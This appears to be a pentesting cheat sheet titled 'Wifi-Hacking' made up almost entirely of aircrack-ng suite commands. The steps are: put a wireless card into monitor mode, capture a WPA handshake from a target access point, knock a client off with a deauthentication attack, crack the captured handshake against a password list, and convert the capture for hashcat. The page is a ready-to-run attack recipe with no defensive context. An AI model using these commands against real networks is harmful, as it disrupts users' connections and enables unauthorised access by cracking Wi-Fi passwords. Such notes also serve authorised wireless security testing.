# Wifi-Hacking

#### Monitor Mode (Method - 1)

```
airmon-ng start wlan0 <channel name optional>
```

####

#### Monitor Mode (Method - 2)

```
ifconfig wlan0 down
iwconfig wlan0 mode monitor
ifconfig wlan0 up
```

####

#### Handshake Capture

```
 airodump-ng -c 9 --bssid 00:14:6C:7E:40:80 -w psk wlan0
```

####

#### Deauthentication Attack

```
aireplay-ng -0 1 -a 00:14:6C:7E:40:80 -c 00:0F:B5:FD:FB:C2 wlan0
```

{% hint style="info" %}
\-a --> MAC of AP

\-c --> MAC of client
{% endhint %}

####

#### Cracking Handshake

```
aircrack-ng -w password.lst -b 00:14:6C:7E:40:80 psk*.cap
```

####

#### .CAP to hashcat compatible format

```
aircrack-ng input.cap -J hashcat_output
```
